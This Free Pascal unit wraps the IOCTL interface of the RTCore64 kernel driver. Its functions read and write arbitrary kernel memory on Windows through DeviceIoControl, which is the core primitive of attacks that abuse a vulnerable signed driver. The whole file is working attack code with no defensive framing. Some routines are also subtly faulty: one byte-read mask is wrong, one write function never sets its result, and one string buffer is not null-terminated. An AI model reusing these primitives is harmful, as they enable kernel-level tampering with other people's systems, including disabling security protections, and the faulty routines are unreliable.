unit urtcore;

{$mode objfpc}{$H+}

interface

uses
  windows,sysutils;


function WriteMemoryPrimitive( Device:HANDLE;  Size:DWORD;  Address:DWORD64;  Value:DWORD):boolean;
function WriteMemoryDWORD64( Device:HANDLE;  Address:DWORD64;  Value:DWORD64):boolean;

function ReadMemoryPrimitive( Device:thandle;  Size:dword; Address:DWORD64):dword;
function ReadMemoryDWORD64( Device:HANDLE;  Address:DWORD64):DWORD64;
function ReadMemoryDWORD( Device:HANDLE;  Address:DWORD64):DWORD;
function ReadMemoryWORD( Device:HANDLE;  Address:DWORD64):WORD;
//to be checked
//function ReadMemoryByte( Device:HANDLE;  Address:DWORD64):Byte;
function ReadMemory16bytes( Device:HANDLE;  Address:DWORD64):string;

implementation

type RTCORE64_MSR_READ =record
  Register_:DWORD;
  ValueHigh:DWORD;
  ValueLow:DWORD;
  end;

type  RTCORE64_MEMORY_READ=record
   Pad0:array[0..7] of byte;
   Address:DWORD64;
   Pad1:array[0..7] of byte;
   ReadSize:DWORD;
   Value:DWORD;
   Pad3:array[0..15] of byte;
end;

const  RTCORE64_MSR_READ_CODE = $80002030;
const  RTCORE64_MEMORY_READ_CODE = $80002048;
const  RTCORE64_MEMORY_WRITE_CODE = $8000204c;

{
  #define IOCTL_MSRREAD		0x80002030
  #define IOCTL_MSRWRITE		0x80002034
  #define IOCTL_MAPIOSPACE	0x80002040
  #define IOCTL_UNMAPIOSPACE	0x80002044
  #define IOCTL_MEMREAD		0x80002048
  #define IOCTL_MEMWRITE		0x8000204C
}

function WriteMemoryPrimitive( Device:HANDLE;  Size:DWORD;  Address:DWORD64;  Value:DWORD):boolean;
var
     MemoryRead:RTCORE64_MEMORY_READ;
        BytesReturned:DWORD=0;
begin
    fillchar(MemoryRead,sizeof(MemoryRead),0);
    MemoryRead.Address := Address;
    MemoryRead.ReadSize := Size;
    MemoryRead.Value := Value;

    //writeln('MemoryRead.Address :=' + inttohex(Address,sizeof(address)));
    //writeln('MemoryRead.ReadSize :=' + inttostr(Size));

    result:=DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        @MemoryRead,
        sizeof(MemoryRead),
        @MemoryRead,
        sizeof(MemoryRead),
        @BytesReturned,
        nil);
    //writeln('result:'+BoolToStr (result));
    //writeln('BytesReturned:'+inttostr (BytesReturned));
end;

function WriteMemoryDWORD64( Device:HANDLE;  Address:DWORD64;  Value:DWORD64):boolean;
begin
    WriteMemoryPrimitive(Device, 4, Address, Value and $ffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value shr 32);
end;

function ReadMemoryPrimitive( Device:thandle;  Size:dword; Address:DWORD64):dword;
var
   MemoryRead:RTCORE64_MEMORY_READ;
   BytesReturned:DWORD=0;
begin
  fillchar(MemoryRead,sizeof(MemoryRead),0);
  MemoryRead.Address := Address;
  MemoryRead.ReadSize := Size;
  //writeln('MemoryRead.Address :=' + inttohex(Address,sizeof(address)));
  //writeln('MemoryRead.ReadSize :=' + inttostr(Size));
  DeviceIoControl(Device,
                  RTCORE64_MEMORY_READ_CODE,
                  @MemoryRead,
                  sizeof(MemoryRead),
                  @MemoryRead,
                  sizeof(MemoryRead),
                  @BytesReturned,
                  nil);

  result:= MemoryRead.Value;
end;

function ReadMemoryByte( Device:HANDLE;  Address:DWORD64):Byte;
begin
    result:= ReadMemoryPrimitive(Device, 1, Address) and $ffffff;
end;

function ReadMemoryWORD( Device:HANDLE;  Address:DWORD64):WORD;
begin
    result:= ReadMemoryPrimitive(Device, 2, Address) and $ffff;
end;

function ReadMemoryDWORD( Device:HANDLE;  Address:DWORD64):DWORD;
begin
    result:= ReadMemoryPrimitive(Device, 4, Address);
end;

function ReadMemoryDWORD64( Device:HANDLE;  Address:DWORD64):DWORD64;
begin
    //return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
    result:= dword64(ReadMemoryDWORD(Device, Address + 4)) shl 32;
    result := result or ReadMemoryDWORD(Device, Address);
end;

function ReadMemory16bytes( Device:HANDLE;  Address:DWORD64):string;
var ret:dword64;
   ar:array[0..15] of char;
begin
    //return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
    ret:= dword64(ReadMemoryDWORD(Device, Address + 4)) shl 32;
    ret := ret or ReadMemoryDWORD(Device, Address);
    CopyMemory(@ar[0],@ret,8);
    inc(address,8);
    ret:= dword64(ReadMemoryDWORD(Device, Address + 4)) shl 32;
    ret := ret or ReadMemoryDWORD(Device, Address);
    CopyMemory(@ar[0+8],@ret,8);

    result:=strpas(ar);
end;

end.

